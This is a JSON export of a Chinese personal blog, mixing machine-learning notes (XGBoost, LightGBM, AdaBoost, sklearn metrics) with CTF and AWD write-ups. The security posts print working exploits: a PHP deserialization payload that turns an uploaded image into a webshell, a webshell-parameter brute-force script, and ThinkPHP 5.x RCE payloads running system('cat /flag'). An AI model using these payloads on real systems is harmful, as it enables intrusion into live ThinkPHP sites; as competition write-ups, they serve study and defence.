{"meta":{"title":"Math & Sec ，CHP的个人博客","subtitle":"Focus","description":"记录追逐时间的points与闪现的ideas。","author":"CHP","url":"http://hachp1.github.io"},"pages":[{"title":"About","date":"2018-04-04T13:18:45.000Z","updated":"2019-01-24T12:59:31.303Z","comments":true,"path":"about/index.html","permalink":"http://hachp1.github.io/about/index.html","excerpt":"","text":"某大学学僧，学习MachineLearning，学习Web安全ing。 啥都想学？啥都想学是不可能的，这辈子都不可能的，学一个又不会，就只能学几个才能维持得了生计这样子XD"},{"title":"归档","date":"2019-01-24T12:57:35.067Z","updated":"2019-01-24T12:57:35.067Z","comments":true,"path":"archive/index.html","permalink":"http://hachp1.github.io/archive/index.html","excerpt":"","text":""},{"title":"Categories","date":"2018-04-03T02:14:02.555Z","updated":"2017-08-31T04:13:03.000Z","comments":true,"path":"categories/index.html","permalink":"http://hachp1.github.io/categories/index.html","excerpt":"","text":""},{"title":"Tags","date":"2018-04-03T02:14:19.157Z","updated":"2017-08-31T04:13:03.000Z","comments":true,"path":"tags/index.html","permalink":"http://hachp1.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"2019第三届强网杯部分WEB WP","slug":"2019第三届强网杯部分WEB-WP","date":"2019-05-30T03:13:55.000Z","updated":"2019-05-30T14:48:16.292Z","comments":true,"path":"posts/Web安全/20190530-19qwb.html","link":"","permalink":"http://hachp1.github.io/posts/Web安全/20190530-19qwb.html","excerpt":"2019第三届强网杯部分WEB WP","text":"2019第三届强网杯部分WEB WP UPLOAD 注意此题需要在PHP7环境中才能复现，在PHP5中由于异常处理机制，不会调用析构函数。 打开网页，发现是一个注册登陆页面，注册之后可以上传图片。 扫描根目录，发现有源码www.gz.tar，下载后可以看到在tp5目录中有.idea文件夹，说明是使用phpstorm写的。导入phpstorm发现了两个断点： 1234567//Register.phppublic function __destruct() &#123; if(!$this-&gt;registed)&#123; $this-&gt;checker-&gt;index(); // 断点1 &#125; &#125; 12345678910111213//Index.phppublic function login_check()&#123; $profile=cookie('user'); if(!empty($profile))&#123; $this-&gt;profile=unserialize(base64_decode($profile)); // 断点2 $this-&gt;profile_db=db('user')-&gt;where(\"ID\",intval($this-&gt;profile['ID']))-&gt;find(); if(array_diff($this-&gt;profile_db,$this-&gt;profile)==null)&#123; return 1; &#125;else&#123; return 0; &#125; &#125; 提示反序列化存在漏洞。 结合本题为上传题，猜测是要结合反序列化和上传两个点攻击。观察析构函数，如果registed为False则调用checker的index函数。 查找是否有可以利用的类，发现Profile.php中的Profile类中无index函数，而且有__call函数： 123456public function __call($name, $arguments) &#123; if($this-&gt;&#123;$name&#125;)&#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125; &#125; 如果调用Profile类的index函数，就会调用__call('index')，此时，如果构造的Profile类的index指向任意一个函数，就会调用该函数。而本题是上传题，首先想到upload_img函数: 123456789101112131415161718192021222324252627public function upload_img()&#123; if($this-&gt;checker)&#123; if(!$this-&gt;checker-&gt;login_check())&#123; $curr_url=\"http://\".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'].\"/index\"; $this-&gt;redirect($curr_url,302); exit(); &#125; &#125; if(!empty($_FILES))&#123; $this-&gt;filename_tmp=$_FILES['upload_file']['tmp_name']; $this-&gt;filename=md5($_FILES['upload_file']['name']).\".png\"; $this-&gt;ext_check(); &#125; if($this-&gt;ext) &#123; if(getimagesize($this-&gt;filename_tmp)) &#123; @copy($this-&gt;filename_tmp, $this-&gt;filename); @unlink($this-&gt;filename_tmp); $this-&gt;img=\"../upload/$this-&gt;upload_menu/$this-&gt;filename\"; $this-&gt;update_img(); &#125;else&#123; $this-&gt;error('Forbidden type!', url('../index')); &#125; &#125;else&#123; $this-&gt;error('Unknow file type!', url('../index')); &#125; &#125; 可以看到在if($this-&gt;ext)之后的逻辑中，可以通过修改$this-&gt;filename_tmp和$this-&gt;filename达到图片重命名的目的，将上传的图片马还原为webshell。 所以先上传一个图片马。 然后构造payload： 123456789101112131415161718192021222324252627&lt;?phpnamespace app\\web\\controller;class Register&#123; public $checker;&#125;class Profile&#123; public $filename_tmp; public $filename; public $ext; public $except; public $index;&#125;$reg=new Register();$prof=new Profile();$prof-&gt;filename_tmp='upload/837ec5754f503cfaaee0929fd48974e7/00bf23e130fa1e525e332ff03dae345d.png';//原文件名（图片马$prof-&gt;filename='upload/1.php';//目标文件名$prof-&gt;ext=true;//过检查$prof-&gt;index='upload_img';$reg-&gt;registed = false;//register析构函数中的条件$reg-&gt;checker=$prof;echo base64_encode(serialize($reg)); 将输出代替cookie中的user值，访问。 7. 可以看到成功重命名webshell了。 8. 拿蚁剑连接可以在根目录处找到flag。 高明的黑客 我在做这道题的时候想的是用hook，但是发现这道题用hook似乎没办法做，因为文件太多了，而只有一个文件可以用，不可能手工挨个试。 在本地复现的时候，想法很简单，先按文件匹配出POST和GET的参数，然后对每个参数都传入system(whoami)和whoami，分别对应eval型和直接调用system型webshell。 ### 做题过程： 下载源码 编写脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import osimport requestsimport redef return_files(rootDir): list_dirs = os.walk(rootDir) funfiles=[] for root, dirs, files in list_dirs: for f in files: funfiles.append(os.path.join(root, f)) return funfilesIF_DEBUG=Falseexp_list=['whoami','system(\"whoami\")']url_pre='http://localhost:802/qwb/web2/'pat1=r\"\\$_GET\\['(\\w+)'\\]\"pat2=r\"\\$_POST\\['(\\w+)'\\]\"files=return_files('src')i=0for vfile in files: print(i,vfile) i+=1 get_params=[] post_params=[] with open(vfile) as fr: try: lines=fr.readlines() except UnicodeDecodeError: print(vfile) continue for line in lines: get_params+=re.findall(pat1,line) post_params+=re.findall(pat2,line) for exp in exp_list: post_dic=&#123;&#125; for post_param in post_params: post_dic[post_param]=exp shell_name=vfile[4:] if(len(get_params+post_params)!=0): t1=requests.get(url_pre+shell_name).text temp_url=url_pre+shell_name+'?' for get_param in get_params: temp_url+=get_param+'='+exp+'&amp;' temp_url=temp_url[:-1] if(IF_DEBUG): print(t1) print(temp_url) print(post_dic) exit() t2=requests.post(temp_url,data=post_dic).text if(len(t1)!=len(t2)): print(temp_url) print(post_dic) 对本地一通扫之后，输出： 1http://localhost/qwb/web2/xk0SzyKwfzw.php?z5c_TrB=whoami&amp;xd0UXc39w=whoami&amp;xd0UXc39w=whoami&amp;DdWk_nXmZTF_Dt=whoami&amp;dthxTqRPg8YtH=whoami&amp;ImPVuGCXfrS=whoami&amp;O0yRgyjaOF7m=whoami&amp;DeMcscsp=whoami&amp;YV8nqJDhD=whoami&amp;EMNPxS2A7=whoami&amp;kBVLzQEgb=whoami&amp;kBVLzQEgb=whoami&amp;Efa5BVG=whoami&amp;i_QfWB2x1=whoami&amp;i_QfWB2x1=whoami&amp;E8NPXbr7Cq=whoami&amp;zfEddFlxaK_FTO3A=whoami&amp;qjWSY5fjcgNtb=whoami&amp;qUVRuZTF27EhUKTI=whoami 由于不想挨个找参数，我直接替换掉每个参数： 12url='http://localhost/qwb/web2/xk0SzyKwfzw.php?z5c_TrB=whoami&amp;xd0UXc39w=whoami&amp;xd0UXc39w=whoami&amp;DdWk_nXmZTF_Dt=whoami&amp;dthxTqRPg8YtH=whoami&amp;ImPVuGCXfrS=whoami&amp;O0yRgyjaOF7m=whoami&amp;DeMcscsp=whoami&amp;YV8nqJDhD=whoami&amp;EMNPxS2A7=whoami&amp;kBVLzQEgb=whoami&amp;kBVLzQEgb=whoami&amp;Efa5BVG=whoami&amp;i_QfWB2x1=whoami&amp;i_QfWB2x1=whoami&amp;E8NPXbr7Cq=whoami&amp;zfEddFlxaK_FTO3A=whoami&amp;qjWSY5fjcgNtb=whoami&amp;qUVRuZTF27EhUKTI=whoami'print(url.replace('whoami','cat /flag')) 访问得到flag 强网先锋 上单 进入界面，发现thinkphp版本为5.0.22，立刻想到前端时间写过博客的RCE，直接上payload： 1index.php?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag 拿到flag 前两道题的源码 https://github.com/HACHp1/hackable_cms_store/tree/master/qwb","categories":[{"name":"Web安全","slug":"Web安全","permalink":"http://hachp1.github.io/categories/Web安全/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://hachp1.github.io/tags/Web安全/"}]},{"title":"树相关-XGBoost与LightGBM","slug":"树相关-XGBoost与LightGBM","date":"2019-04-09T09:49:27.000Z","updated":"2019-04-09T10:22:40.456Z","comments":true,"path":"posts/机器学习/20190409-treeAlgorithm2.html","link":"","permalink":"http://hachp1.github.io/posts/机器学习/20190409-treeAlgorithm2.html","excerpt":"前一篇树相关的文章挖了一个XGBoost的坑，在此篇里把坑填上。同时，对XGBoost的改进模型（替代模型）LightGBM作一个介绍。","text":"前一篇树相关的文章挖了一个XGBoost的坑，在此篇里把坑填上。同时，对XGBoost的改进模型（替代模型）LightGBM作一个介绍。 对GBDT的一点补充 上一篇中提到GBDT整个算法的运行过程，将拟合残差操作晋升为对残差在函数空间内的梯度下降。由于是梯度下降，就有学习速度。在传统GBDT中同样有一个学习速度。 XGBoost XGBoost也是提升树的一种。其实它不仅仅是树模型，XGBoost支持树、线性函数甚至自定义函数作为基本弱分类器。虽然在使用时多数情况还是用树作为其弱分类器，但将其作为典型的提升模型更好理解。 XGBoost的算法以及一些细节 总括：XGBoost可以通过对GBDT的一些改动直接得到： 优化目标（代价函数）更合理：XGBoost优化目标由牛顿法得到（拟合二阶泰勒展开），比GBDT的梯度下降（单纯拟合误差）更合理。同时，总代价函数可以使用残差平方和、交叉熵甚至自己定义的二阶可导的函数。 弱分类器本身的生成过程更合理：XGBoost优化函数中添加了正则项，可以起到预剪枝的作用，防止过拟合。使用的信息增益函数是考虑到牛顿法和正则项之后的综合式子。 特征选择的改进：借鉴了RF的方法，每次计算只抽取部分特征。 模型更灵活（可选，因为一般还是用XGBoost本身的树模型）：GBDT以CART为基本弱分类器；XGBoost可以使用树、线性函数甚至自定义函数作为弱分类器。 正则项的定义与详细意义 XGBoost的正则项为： \\[ \\gamma T+\\frac{1}{2}\\lambda \\sum^{T}_{j=1}\\omega^2_j \\] 其中，T为叶子节点个数，\\(\\omega\\)为叶子节点分数（叶子节点的预测值）。 代价函数（牛顿法使之最小） \\[ L(\\theta)=\\sum_{i=1}^T l(y_i,y_{pred_i})+ \\gamma T+\\frac{1}{2}\\lambda \\sum^{T}_{j=1}\\omega^2_j \\] 增益函数，在代价函数的牛顿法过程中引入分裂代价（即单个弱分类器要最大化的目标，由于使用了牛顿法，与GBDT的思想稍有不同） \\[ Gain=\\frac{G^2_L}{H_L+\\lambda}+\\frac{G^2_R}{H_R+\\lambda}-\\frac{(G_L+G_R)^2}{H_L+H_R+\\lambda}-\\gamma \\] 此式来源于牛顿法，以牛顿法的式子（详见后文的链接）来代表增益程度，同时引入分裂代价\\(\\gamma\\)。在优化单个弱分类器时，使之达到最大即等价于使用二阶泰勒展开的牛顿法对总分类器的优化。 之后，使用穷举或者分段（分段时以二阶导数的值作为权重，核心思想是等分目标函数，具体见wepon的ppt）的方法寻找最优（使Gain函数最大）的分裂点可构造弱分类器。 详细的推导过程：Introduction to Boosted Trees 中文推导过程：http://wepon.me/files/gbdt.pdf 刚开始个人认为的类比GBDT过程的弱分类器优化目标（但实际上没有用）： \\[ -\\frac{G_j}{H_j+\\lambda} \\] 最后的一些思考 在学习GBDT和XGBoost的时候，有一些个人思考。在这里先记下来。 对在函数空间的梯度下降和泰勒展开的思考 首先是泰勒展开，泰勒展开是使构造函数在自变量变化后尽可能使其无限逼近原函数的方法（加大续航能力）。而此处的自变量是该阶段的弱分类器，所以此处使用二阶泰勒展开确实能比单纯的一阶展开更加有效的理由是二阶泰勒对弱分类器的变化有更好的适应性。 另一个角度。这里使用泰勒展开的原因是这里使用了比梯度下降更快的牛顿法进行优化。至于为何更快，因为牛顿法是延二次曲线进行下降，而梯度下降是延直线下降，普适性不如二次函数。 刚开始推导时的几个疑问 在牛顿法的使用中，XGBoost直接将最优化的结果带入了LOSS函数，以化简后的式子中提取出的式子作为Gain函数构造的依据，并且最大化Gain函数。为什么可以直接把假设优化好的函数进一步优化？在XGBoost作者陈天其的slide中直接声明其可以衡量叶子节点的好坏。 在弱分类器构造的过程中，直接使用了Gain函数而不是类似于GBDT的拟合误差的操作。Gain函数的来源是假设当前叶子已取最优，然后在这个基础上又继续可能这里是作者优化的一个操作，但是我没有理解。 解释：\\(w\\)与\\(G\\)、 \\(H\\)是相互独立的，所以可以先得到\\(w\\)关于G和H的表达式后直接对G和H进行优化。这里对w运用泰勒展开巧妙的将待更新函数剥离了出来，使得控制树的准确度的w和控制树结构的G与H可以单独考虑。所以这里进行连续两步优化是没有问题的，因为它们是相互独立的。这里也可以近似的认为，由于分类树确定分裂点后（确定树结构），w也就确定了，所以w可以用G、H来表示。 参考资料 XGBoost: A Scalable Tree Boosting System Introduction to Boosted Trees pdf Introduction to Boosted Trees 机器学习算法中 GBDT 和 XGBOOST 的区别有哪些？ - wepon的回答 - 知乎 GBDT算法原理与系统设计简介,by wepon LGBM LGBM是对XGB在速度与空间代价上进行优化后得到的。 优势 更快的训练效率 低内存使用 支持并行学习 可处理大规模数据 LGBM在表现上（调参与理解）和XGB的不同 直方图算法在划分点上没有预排序精确（只取大概位置），正因如此，反而自带正则化的效果。 单棵树分裂方式不同：XGB按层（一般）、LGBM按深度。 算法细节 直方图算法 把连续的浮点特征值离散化成k个整数，同时构造一个宽度为k的直方图。在遍历数据的时候，根据离散化后的值作为索引在直方图中累积统计量，当遍历一次数据后，直方图累积了需要的统计量，然后根据直方图的离散值，遍历寻找最优的分割点。 减小内存占用，节省7/8 减小split finding时计算增益的计算量， 从O(#data) 降至O(#bins) 直方图作差 一个叶子的直方图可以由它的父亲节点的直方图与它兄弟节点的直方图作差得到，提升一倍速度。 Gradient-based One Side Sampling (GOSS) 在每一次迭代前，利用了GBDT中的样本梯度和误差的关系，对训练样本进行采样:对误差大（梯度绝对值大）的数据保留；对误差小的数据采样一个子集，但给这个子集的数据一个权重，让这个子集可以近似到误差小的数据的全集。 此方法与Focal Loss有相通的地方。Focal Loss是根据各类样本数量调整LOSS函数各类样本的权重达到类似重采样的效果。而这里的GOSS只取部分误差小的并加上权重，从而代替所有误差小的样本，也有一个从权重代替数量的操作。 Exclusive Feature Bundling (EFB) 在特征维度很大的数据上，特征空间一般是稀疏的。利用这个特征可以无损地降低构造特征直方图（训练GBDT的主要时间消耗）需要遍历的特征数量。 对于稀疏特征，只需要 O(2 * #non_zero_data) 来构建直方图。 带深度限制的 Leaf-wise 的叶子生长策略 XGB分裂方法有两种：Level-wise（预排序算法只支持Level-wise），同一层所有节点都做分裂，最后剪枝；Leaf-wise（直方图法才支持）选取具有最大增益的节点分裂。一般的XGB都使用Level-wise。 LGBM只能使用Leaf-wise，容易过拟合，需要通过max_depth限制模型，防止过拟合。 特征并行与数据并行的优化 在传统并行方法上作出的一些改进。 参考资料 GBDT、XGBoost、LightGBM 的使用及参数调优 GBDT算法原理与系统设计简介,by wepon","categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://hachp1.github.io/categories/机器学习/"}],"tags":[{"name":"机器学习-算法","slug":"机器学习-算法","permalink":"http://hachp1.github.io/tags/机器学习-算法/"}]},{"title":"Thinkphp 5.x RCE漏洞","slug":"thinkphp-5-x-RCE漏洞","date":"2019-01-23T16:04:00.000Z","updated":"2019-01-24T13:25:55.123Z","comments":true,"path":"posts/Web安全/20190124-5.x RCE.html","link":"","permalink":"http://hachp1.github.io/posts/Web安全/20190124-5.x RCE.html","excerpt":"Thinkphp 5.x RCE漏洞 0x0 概要 Thinkphp为MVC处理结构，通过对路由的解析，使用控制器调用函数。 由于对兼容模式的路由处理没有进行过滤等，可以调用命名空间下的任意函数，从而产生了RCE漏洞。","text":"Thinkphp 5.x RCE漏洞 0x0 概要 Thinkphp为MVC处理结构，通过对路由的解析，使用控制器调用函数。 由于对兼容模式的路由处理没有进行过滤等，可以调用命名空间下的任意函数，从而产生了RCE漏洞。 ## 0x1 基础知识 Thinkphp 兼容模式 兼容模式是用于不支持PATHINFO的特殊环境，使用时，URL地址形如： http://localhost/?s=/home/user/login/var/value 或 ?s=module/controller/action Thinkphp App类的内置函数调用 12345678/** * 执行函数或者闭包方法 支持参数调用 * @access public * @param string|array|\\Closure $function 函数或者闭包 * @param array $vars 变量 * @return mixed */ App::invokeFunction($function, $vars = []) 0x2 代码追踪 按照爆出phpinfo的执行过程跟踪。 POC中，使用invokefunction函数对phpinfo进行调用，且解析url中的vars，将其传入phpinfo中，payload为： 1http://localhost:801/cms/thinkphp/thinkphp_5.0.22/public/index.php?s=index/\\think\\app/invokefunction&amp;function=phpinfo&amp;vars[0]=-1 首先需要对thinkphp的路由操作做分析。 传入兼容模式的s，所以是对s进行路由 1234// 未设置调度信息则进行 URL 路由检测 if (empty($dispatch)) &#123; $dispatch = self::routeCheck($request, $config); &#125; 跟踪至函数内： 12// 路由检测（根据路由定义返回不同的URL调度） $result = Route::check($request, $path, $depr, $config['url_domain_deploy']); 进一步跟踪： 123456789101112if (false !== strpos($url, '?')) &#123; // [模块/控制器/操作?]参数1=值1&amp;参数2=值2... $info = parse_url($url); $path = explode('/', $info['path']); parse_str($info['query'], $var); &#125; elseif (strpos($url, '/')) &#123; // [模块/控制器/操作] $path = explode('/', $url); &#125; else &#123; $path = [$url]; &#125; return [$path, $var]; 可以看到，代码没有对操作做出任何过滤和检测，直接将模块、控制器（命名空间）和操作函数解析了。 运行到此处时，path已经被分割为三部分。 之后，代码就会执行解析好的函数： 1$data = self::exec($dispatch, $config); 执行函数 1234567891011if (is_callable([$instance, $action])) &#123; // 执行操作方法 $call = [$instance, $action]; // 严格获取当前操作方法名 $reflect = new \\ReflectionMethod($instance, $action); $methodName = $reflect-&gt;getName(); $suffix = $config['action_suffix']; $actionName = $suffix ? substr($methodName, 0, -strlen($suffix)) : $methodName; $request-&gt;action($actionName); &#125; 此时，invokefunction已经将传入的函数执行。 0x 3一些坑以及查阅资料得到 对于windows和linux系统，该漏洞的触发情况不一样，windows系统是对大小写敏感的，所以一些函数无法调用。 在本机（windows系统）下测试网上的写入webshell和执行系统命令的POC都失败了，并且在跟踪的过程中发现源代码也不太一样，一是本地测试使用的5.0.22非完整版本，二是本地服务器的安全设置问题。","categories":[{"name":"Web安全","slug":"Web安全","permalink":"http://hachp1.github.io/categories/Web安全/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://hachp1.github.io/tags/Web安全/"}]},{"title":"树相关-从决策树到kaggle大杀器","slug":"树相关-从决策树到kaggle大杀器","date":"2018-12-04T04:19:41.000Z","updated":"2019-04-09T01:13:06.215Z","comments":true,"path":"posts/机器学习/20181204-treeAlgorithm.html","link":"","permalink":"http://hachp1.github.io/posts/机器学习/20181204-treeAlgorithm.html","excerpt":"决策树 决策树的最优分支选择 分类树 枚举所有可能的划分，每次计算一个代价值，取代价最低的分裂方法。 设定一个阈值，若超过，则分裂。 回归树 在一次分裂时，遍历所有划分方法（每次划分为两组，分别计算损失函数并相加），找出损失函数和最小的作为本次分裂；然后使用递归划分出所有可能。 预测时，使用分组的组内平均数作为该组所有元素的预测值；损失函数可以用该组的各值与该组的平均数的残差平方和。","text":"决策树 决策树的最优分支选择 分类树 枚举所有可能的划分，每次计算一个代价值，取代价最低的分裂方法。 设定一个阈值，若超过，则分裂。 回归树 在一次分裂时，遍历所有划分方法（每次划分为两组，分别计算损失函数并相加），找出损失函数和最小的作为本次分裂；然后使用递归划分出所有可能。 预测时，使用分组的组内平均数作为该组所有元素的预测值；损失函数可以用该组的各值与该组的平均数的残差平方和。 普通回归树的训练过程 对回归树结果的不太恰当的通俗理解：在一个局部范围内用平均值来预测这个局部内的所有点的值。 回归树的训练过程是一个递归的过程，首先，从分析一个递归环节开始： 随机选取一个特征 先找到对这个特征的各个二划分点 分别对每个划分点作如下计算： 因为每组的预测值为平均数，第i个分组（一共两个分组）的损失函数L(i)为： \\[ L(i)=\\sum_{j=0}^{1}{(y_i^{(j)}-mean_i)^2} \\] 其中，\\(j\\)为对第i组中每个数的遍历序数，\\(mean_i\\)为第i组的平均数 整个树在此划分下的损失函数为： \\[ L=\\sum_i{L(i)} \\] 比较所有划分，在回归树本次分裂时，取\\(L\\)最小的划分点作为本次划分点，完成一次递归。 经过n次递归达到给定的要求时，回归树停止分裂。 集成树 集成树是树模型的一大类模型(boost模型)，采用各个树的预测值相加作为预测结果的计算方法进行预测。 AdaBoost 一些特征： 1. 首先，AdaBoost是一种二分类算法。 2. 加性模型，使用前向分步算法作为各个数学公式的来源和依据（即公式为啥长这样）。 3. 从训练数据中学习一系列弱分类器或基本分类器，然后将这些弱分类器组合成一个强分类器 4. 通俗理解思想：增大被分错的数据的权重，减小错误率高的弱分类器的作用。整个学习过程就像是先粗略的对整个数据集进行划分（在递归中的第一个分类器），然后对剩下的分错的数据集抽出来重点对待再次划分（递归中的第二个分类器）；通过两种权重的组合（数据权重和弱分类器权重）作用巧妙地得出最终的分类器。这个思想和泰勒展开有着异曲同工之妙，即先大概分，再细分；先整体符合，再对细节下手。 5. 关键：1、如何更新数据的权重。2、如何组合弱分类器（分类器权重）。 整个函数的目的是将\\(X\\)映射到\\(\\{-1,1\\}\\)，即求函数:\\(G_m(x)→\\{-1,1\\}\\) 整个过程： 权值初始化，所有权值最开始时都被赋予相同的值： \\[ \\frac{1}{N} \\] 其中，N是总弱学习器的个数。 构建弱分类器 使用具有权值分布\\(D_m\\)的训练数据集学习，得到基本分类器（具体过程：穷举每个阈值，使用公式计算误差\\(e_m\\)（公式见后文）选取让误差最低的阈值来设计基本分类器，即一个简单的二分类器） 计算弱分类器权重：思想为根据错误率调整权重的大小，错误率越大，权值越小。整个权值更新过程如下： 首先，计算中间系数\\(α_m\\)，公式为： \\[ α_m=\\frac{1}{2}ln\\frac{1-e_m}{e_m} \\] \\(e_m\\)为误差，计算公式为： \\[ e_m=P(G_m(x_i)≠y_i)=\\sum_{i=1}^{N}w_{mi}I(G_m(x_i)≠y_i) \\] \\(w_{mi}\\)为当前的权重。 \\(I\\)为指示函数，代表的是指示函数（indicator function）。 它的含义是：当输入为True的时候，输出为1，输入为False的时候，输出为0。 然后，更新数据权重，过程为： \\[ D_{m+1}=(w_{m+1,1},...,w_{m+1,i},...,w_{m+1,N}) \\] \\[ w_{m+1,i}=\\frac{w_{mi}}{Z_m}e^{-α_my_iG_m(x_i)},i=1,2,...,N \\] 其中，\\(Z_m\\)的计算过程： \\[ Z_m=\\sum_{i=1}^{N}w_{mi}e^{-α_my_iG_m(x_i)} \\] 重复以上步骤（从构造弱分类器开始），直到触发某终止条件。 最后，将获得的所有弱分类器与其权值相乘并相加，得到最终分类器： \\[ G(x)=sign(f(x))=sign(\\sum^{M}_{m=1}α_mG_m(x)) \\] 此外，最后获得的分类器的误差值\\(e_m\\)有一个上界，其值为： \\[ \\frac{1}{N}\\sum^N_{i=1}I(G(x_i)≠y_i)\\le\\frac{1}{N}\\sum_ie^{-y_if(x_i)}=\\prod_m{Z_m} \\] 还有一些数学特征详见书上。 参考资料: 李航《统计学习方法》 知乎上的一篇精彩解说 机器学习算法中GBDT与Adaboost的区别与联系是什么？- Frankenstein 推荐blog AdaBoost原理（包含权重详细解释） GBDT(Gradient Boosting Decision Tree)梯度上升树 Gradient Boosting是对AdaBoost的推广。 AdaBoost算法中，计算过程没有涉及到凸优化过程，整个过程是通过调整两个权重展开的。 而GBDT从侧面用到了梯度上升的概念（恰巧完成了一个梯度下降的操作）。因此相比AdaBoost, Gradient Boosting可以使用更多种类的目标函数。 GBDT和AdaBoost都结合“从整体到细节”的思想，使每个弱分类器对剩下的细节（即残差或误差量，GBDT是残差）进一步拟合，最后就得到了结果。 整理一下思路，GBDT的过程为：首先通过某种拟合方法找到第一个函数（回归树）\\(h_1(x)\\)（已经通过梯度下降最优化），然后对残差 \\[ \\sum_iy_i-h_1(x_i) \\] 计算并以之为目标函数拟合第二棵回归树。以这种做法递归下去直到达到某种条件即可停止训练。最后的预测函数即 \\[ F(X)=\\sum_i{h(x_i)} \\] 注意，对每个弱分类器的优化是独立于GBDT算法的，优化过程参考以往的学习方法进行，如：梯度下降、穷举。 可以观察到GBDT的一个重要的特性，也就是梯度出现的地方：用回归树去拟合残差其实就是用回归树去拟合目标方程关于\\(F(x_i)\\)的梯度。换句话说，就是拟合残差这一个操作恰巧和梯度下降一步是一样的。 证明： 训练过程中，当前的预测函数即 \\[ F(X)=\\sum_i{h(x_i)} \\] 考虑使用最小二乘代价函数： \\[ L=\\frac{1}{2}\\sum_i(y_i-F(x_i))^2 \\] L对上一个弱分类器单个样本点求偏导有： \\[ \\frac{\\partial{L}}{\\partial{F(x_i)}}=\\frac{\\partial\\frac{1}{2}\\sum_{i}(y_i-F(x_i))^2}{\\partial{F(x_i)}}=-(y_i-F(x_i)) \\] 而\\(y_i-F(x_i)\\)是我们要拟合的对象（GBDT中），所以我们拟合的是代价函数对上一个弱分类器的负梯度。这里联想梯度下降的过程：要更新哪个参数，就对哪个参数求导，所以在这里，我们更新的是弱分类器本身（把上一个分类器当作参数）。将拟合后的结果加入到目标函数中也就相当于对上一阶段加入的弱分类器做了梯度下降。 这就是GBDT中的G（梯度）的来源。 XgBoost XgBoost是GBDT的改进。 XgBoost对GBDT的代价函数加入了正则化项防止过拟合。如，最小二乘代价函数变形为： \\[ L=\\frac{1}{2}\\sum_i(y_i-F(x_i))^2+\\sum_kΩ(f_k) \\] 同时，XgBoost使用二阶泰勒展开来代替GBDT中对上一个弱分类器的一阶导数。 XgBoost相关的解释计划在下一篇继续。 参考资料 XGBoost: A Scalable Tree Boosting System Introduction to Boosted Trees","categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://hachp1.github.io/categories/机器学习/"}],"tags":[{"name":"机器学习-算法","slug":"机器学习-算法","permalink":"http://hachp1.github.io/tags/机器学习-算法/"}]},{"title":"数据预处理及训练结果评估","slug":"数据预处理及训练结果评估","date":"2018-10-09T04:37:58.000Z","updated":"2019-01-24T13:26:57.904Z","comments":true,"path":"posts/机器学习/20181009-metrics.html","link":"","permalink":"http://hachp1.github.io/posts/机器学习/20181009-metrics.html","excerpt":"数据预处理及训练结果评估 归一化(标准化) 1234#库名from sklearn import preprocessing#使用方法X_scaled = preprocessing.scale(X)","text":"数据预处理及训练结果评估 归一化(标准化) 1234#库名from sklearn import preprocessing#使用方法X_scaled = preprocessing.scale(X) K折验证 12345from sklearn.model_selection import train_test_splitX, y = np.arange(10).reshape((5, 2)), range(5)X_train, X_test, y_train, y_test = train_test_split( X, y, test_size=0.125, random_state=0) # 8折验证 准确率、召回率等 123456789101112131415161718192021from sklearn.metrics import precision_scoreprint(precision_score(y_test,y_predict,average=&apos;micro&apos;))#其中，average可选（常用）：&apos;&apos;&apos;宏平均（Macro-averaging），是先对每一个类统计指标值，然后在对所有类求算术平均值。微平均（Micro-averaging），是对数据集中的每一个实例不分类别进行统计建立全局混淆矩阵，然后计算相应指标。&apos;micro&apos;: 计算准确率 &apos;macro&apos;: 计算每个标签的准确率 &apos;weighted&apos;: 根据每个标签出现的数量按权重计算其准确率&apos;binary&apos;: * 计算二分类的准确率（预测为1的准确率） * 在召回率中，则计算预测为1的占总数的百分比&apos;&apos;&apos; 召回率 123from sklearn.metrics import recall_score recall_score(y_true, y_pred, average=&apos;micro&apos;) # average和上一个类似 f1-score 12f1score(y_true, y_pred, average=&apos;micro&apos;) # average和上一个类似 准确率（sklearn训练） 1print(clf.score(x_train, y_train)) PCA降维 1234567891011import sklearn.decomposition.pca as PCA#PCA降维mypca=PCA.PCA(n_components=2)x_test_de=mypca.fit_transform(x_test)'''其中explained_variance_：方差值explained_variance_ratio_：方差占比singular_values_：分解得到的奇异值（不是奇异向量）inverse_transform(X)：按降维操作逆向升维'''","categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://hachp1.github.io/categories/机器学习/"}],"tags":[{"name":"机器学习初步","slug":"机器学习初步","permalink":"http://hachp1.github.io/tags/机器学习初步/"}]},{"title":"2018省赛AWD web writeup","slug":"2018省赛AWD","date":"2018-09-22T06:50:50.000Z","updated":"2019-01-24T13:26:57.066Z","comments":true,"path":"posts/Web安全/20180922-Websec2.html","link":"","permalink":"http://hachp1.github.io/posts/Web安全/20180922-Websec2.html","excerpt":"2018年省赛AWD web writeup 一点寒暄 &gt; 本次比赛还是有很多遗憾，AWD做的太少，再加上经验不足，导致结果不好看，下面开始填坑。 网站框架、版本分析 在ThinkPHP路径下找到ThinkPHP.php文件，在其中找到版本号3.2.3，本版本存在缓存漏洞。 找到之后，搜索出相同出处的网页： 阅读获得thinkphp缓存漏洞的提示。","text":"2018年省赛AWD web writeup 一点寒暄 &gt; 本次比赛还是有很多遗憾，AWD做的太少，再加上经验不足，导致结果不好看，下面开始填坑。 网站框架、版本分析 在ThinkPHP路径下找到ThinkPHP.php文件，在其中找到版本号3.2.3，本版本存在缓存漏洞。 找到之后，搜索出相同出处的网页： 阅读获得thinkphp缓存漏洞的提示。 缓存漏洞分析 ThinkPHP缓存漏洞需要在二次开发时，调用框架的S()函数，如果传入S()函数的变量可控，并且能找到缓存的储存地址（主要是文件名），则可以直接写入并连接webshell。 代码调试跟进 本题直接搜索并不能找出漏洞的触发点，因为S()函数并没有直接的被调用，也没有直接被调用的函数调用S()，但是既然是缓存漏洞，先找到缓存的路径，然后随意浏览网页，终于触发了漏洞点。 能够引起缓存函数执行的地方在主页的搜索框里，当进行一次搜索后，发现缓存文件夹下有文件生成了： 然后开始跟进。 首先，清空缓存文件，在主页代码中打断点： 进一步跟进，在一个执行处打下断点（因为执行之后就产生了缓存文件） 继续跟进下一层网页应用执行处 